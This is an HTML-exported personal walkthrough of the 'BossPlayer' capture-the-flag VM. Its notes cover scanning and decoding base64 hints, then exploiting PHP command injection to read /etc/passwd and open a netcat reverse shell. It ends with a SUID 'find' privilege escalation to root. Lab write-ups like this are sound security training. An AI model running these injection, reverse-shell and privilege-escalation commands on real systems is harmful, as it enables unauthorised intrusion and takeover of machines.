<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>BossPlayer</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="2019.html">2019</a></p>

<ol>
<li><a href="2019--BasicPenTestingBox.html">BasicPenTestingBox</a></li>
<li><a href="2019--BasicPenTestingBox2.html">BasicPenTestingBox2</a></li>
<li><a href="2019--bee_box.html">bee box</a></li>
<li><a href="2019--BossPlayer.html">BossPlayer</a></li>
<li><a href="2019--CyberChallenge19.html">CyberChallenge19</a></li>
<li><a href="2019--Dawn.html">Dawn</a></li>
<li><a href="2019--DC-1.html">DC-1</a></li>
<li><a href="2019--DC-2.html">DC-2</a></li>
<li><a href="2019--DC-3.html">DC-3</a></li>
<li><a href="2019--DerpNStik.html">DerpNStik</a></li>
<li><a href="2019--EVM.html">EVM</a></li>
<li><a href="2019--Fowsniff.html">Fowsniff</a></li>
<li><a href="2019--Gemini_Inc_1.html">Gemini Inc 1</a></li>
<li><a href="2019--JIS_CTF.html">JIS_CTF</a></li>
<li><a href="2019--mullidae.html">mullidae</a></li>
<li><a href="2019--PumpkinFestival.html">PumpkinFestival</a></li>
<li><a href="2019--PumpkinGarden.html">PumpkinGarden</a></li>
<li><a href="2019--PumpkinRaising.html">PumpkinRaising</a></li>
<li><a href="2019--QuaoarCTFHackfest2016.html">QuaoarCTFHackfest2016</a></li>
<li><a href="2019--Rickdiculously_Easy.html">Rickdiculously Easy</a></li>
<li><a href="2019--silky02.html">silky02</a></li>
<li><a href="2019--silky1.html">silky1</a></li>
<li><a href="2019--Typhoon.html">Typhoon</a></li>
<li><a href="2019--VMS_to_try.html">VMS to try</a></li>
<ol>
<li><a href="2019--VMS_to_try--US_Gov_Conf.html">US Gov Conf</a></li>
<li><a href="2019--VMS_to_try--Gruyere.html">Gruyere</a></li>
</ol>
<li><a href="2019--xss_challenges.html">xss challenges</a></li>
<li><a href="2019--Blue.html">Blue</a></li>
<li><a href="2019--mr_robot.html">mr robot</a></li>
<li><a href="2019--Unfinished_VMS.html">Unfinished VMS</a></li>
<ol>
<li><a href="2019--Unfinished_VMS--CasinoRoyale.html">CasinoRoyale</a></li>
<li><a href="2019--Unfinished_VMS--WinterMute_Straylight.html">WinterMute Straylight</a></li>
<li><a href="2019--Unfinished_VMS--connect_the_dots_(unfinished).html">connect the dots (unfinished)</a></li>
<li><a href="2019--Unfinished_VMS--arsenal.html">arsenal</a></li>
<li><a href="2019--Unfinished_VMS--heist.html">heist</a></li>
<li><a href="2019--Unfinished_VMS--MyHouse_Box.html">MyHouse Box</a></li>
<li><a href="2019--Unfinished_VMS--Sputnik.html">Sputnik</a></li>
<li><a href="2019--Unfinished_VMS--Node.html">Node</a></li>
<li><a href="2019--Unfinished_VMS--HackInOs.html">HackInOs</a></li>
<li><a href="2019--Unfinished_VMS--Seattle.html">Seattle</a></li>
<li><a href="2019--Unfinished_VMS--DC416-Galahad.html">DC416-Galahad</a></li>
</ol>
<li><a href="2019--Not_a_Box.html">Not a Box</a></li>
<ol>
<li><a href="2019--Not_a_Box--securitytreasurehunt_web.html">securitytreasurehunt web</a></li>
<li><a href="2019--Not_a_Box--rpc.html">rpc</a></li>
<li><a href="2019--Not_a_Box--msf_fix.html">msf fix</a></li>
</ol>
<li><a href="2019--ICE.html">ICE</a></li>
</ol></div>
<div class="page"><h1><b><u>BossPlayer</u></b></h1>root@kali:~# sudo nmap -PS 192.168.56.1-255<br /><br />Nmap scan report for 192.168.56.102<br />Host is up (0.00011s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br />MAC Address: 08:00:27:80:C2:7A (Oracle VirtualBox virtual NIC)<br /><br />root@kali:~# sudo nmap -A -p- 192.168.56.102<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-26 15:27 EDT<br />Nmap scan report for 192.168.56.102<br />Host is up (0.00036s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 ac:0d:1e:71:40:ef:6e:65:91:95:8d:1c:13:13:8e:3e (RSA)<br />|   256 24:9e:27:18:df:a4:78:3b:0d:11:8a:92:72:bd:05:8d (ECDSA)<br />|_  256 26:32:8d:73:89:05:29:43:8e:a1:13:ba:4f:83:53:f8 (ED25519)<br />80/tcp open  http    Apache httpd 2.4.38 ((Debian))<br />|_http-server-header: Apache/2.4.38 (Debian)<br />|_http-title: Site doesn't have a title (text/html).<br />MAC Address: 08:00:27:80:C2:7A (Oracle VirtualBox virtual NIC)<br />Device type: general purpose<br />Running: Linux 3.X|4.X<br />OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br />OS details: Linux 3.2 - 4.9<br />Network Distance: 1 hop<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE<br />HOP RTT     ADDRESS<br />1   0.36 ms 192.168.56.102<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 10.37 seconds<br /><br /><img src="images/10-1.png" alt="images/10-1.png" /><br /><br />root@kali:~# dirb <a href="http://192.168.56.102/">http://192.168.56.102/</a> /usr/share/wordlists/dirb/common.txt <br /><br />-----------------<br />DIRB v2.22    <br />By The Dark Raver<br />-----------------<br /><br />START_TIME: Sat Oct 26 15:34:02 2019<br />URL_BASE: <a href="http://192.168.56.102/">http://192.168.56.102/</a><br />WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt<br /><br />-----------------<br /><br />GENERATED WORDS: 4612                                                          <br /><br />---- Scanning URL: <a href="http://192.168.56.102/">http://192.168.56.102/</a> ----<br />+ <a href="http://192.168.56.102/index.html">http://192.168.56.102/index.html</a> (CODE:200|SIZE:575)                         <br />+ <a href="http://192.168.56.102/robots.txt">http://192.168.56.102/robots.txt</a> (CODE:200|SIZE:53)                          <br />+ <a href="http://192.168.56.102/server-status">http://192.168.56.102/server-status</a> (CODE:403|SIZE:302)                      <br />                                                                               <br />-----------------<br />END_TIME: Sat Oct 26 15:34:03 2019<br />DOWNLOADED: 4612 - FOUND: 3<br />root@kali:~# <br /><br /><img src="images/10-2.png" alt="images/10-2.png" /><br /><br /><br />super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg==<br /><br />Which is base64 encoded?<br /><br />Decoded it is:  lol try harder bro<br /><br />In index.html source:<br /><br />&lt;!--WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK--&gt;<br /><br />Using cyberchef decoded from base64 3 times:<br /><br />workinginprogress.php<br /><br />Went to the page in browser: <br /><br /><h3>System Install:</h3><br />Linux Debian - [*]<br />APACHE2 - [*]<br />PHP - [*]<br /><br /><h3>Outstanding:</h3><br />Test ping command - [ ]<br />Fix Privilege Escalation - [ ]<br /><br /><h3>Completed:</h3><br />Say Hi to Haley - [*]<br /><br />PHP is injectible:<br /><br /><a href="http://192.168.56.102/workinginprogress.php?cmd=ls">http://192.168.56.102/workinginprogress.php?cmd=ls</a><br /><br />You can see at the bottom of the doc:<br />index.htmllogs.phprobots.txtworkinginprogress.php<br /><br />Show passwd file contents:<br /><a href="http://192.168.56.102/workinginprogress.php?cmd=cat%20/etc/passwd">http://192.168.56.102/workinginprogress.php?cmd=cat%20/etc/passwd</a><br /><br /><br /> root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinavahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologincuong:x:1000:1000:cuong,,,:/home/cuong:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br /> <br /> â†’ There is a user cuong<br /> <br /> <br /> To exploit command injection:<br />We will be using the netcat invoke shell  one-liner. <br />Before running that we need a netcat listener to receive the  shell that is going to be invoked.<br />nc -lvp 1234<br /><br />--&gt; nc -e /bin/bash [my address] [port]<br /><a href="http://192.168.1.107/workinginprogress.php?cmd=nc">http://192.168.1.107/workinginprogress.php?cmd=nc</a> -e /bin/bash 192.168.56.1 1234<br /><br />---&gt; to get a proper shell<br />root@kali:~# nc -lvp 1234<br />listening on [any] 1234 ...<br />192.168.56.102: inverse host lookup failed: Unknown host<br />connect to [192.168.56.1] from (UNKNOWN) [192.168.56.102] 58300<br />python -c 'import pty;pty.spawn("/bin/bash")'<br />www-data@bossplayers:/var/www/html$ <br /><br />FIND files/bin with improper permissions set:<br />find / -perm -u=s -type f 2&gt;/dev/null<br /><br />www-data@bossplayers:/etc$ find / -perm -u=s -type f 2&gt;/dev/null<br />find / -perm -u=s -type f 2&gt;/dev/null<br />/usr/bin/mount<br />/usr/bin/umount<br />/usr/bin/gpasswd<br />/usr/bin/su<br />/usr/bin/chsh<br />/usr/bin/grep<br />/usr/bin/chfn<br />/usr/bin/passwd<br />/usr/bin/find<br />/usr/bin/newgrp<br />/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br />/usr/lib/openssh/ssh-keysign<br />/usr/lib/eject/dmcrypt-get-device<br />www-data@bossplayers:/etc$ find . -exec /bin/sh -p \; quit<br />find . -exec /bin/sh -p \; quit<br />find: paths must precede expression: `quit'<br />www-data@bossplayers:/etc$ find . -exec /bin/sh -p \; -quit<br />find . -exec /bin/sh -p \; -quit<br /># ls<br /><br /># cd /root<br />cd /root<br /># ls<br />ls<br />root.txt<br /># cat root.txt<br />cat root.txt<br />Y29uZ3JhdHVsYXRpb25zCg==<br /># <br /><br />from base64  is congratulations<br /><br />FIN<br /><br /><br /><br /> <br /> <br /><br /><br /></div></div>
</body></html>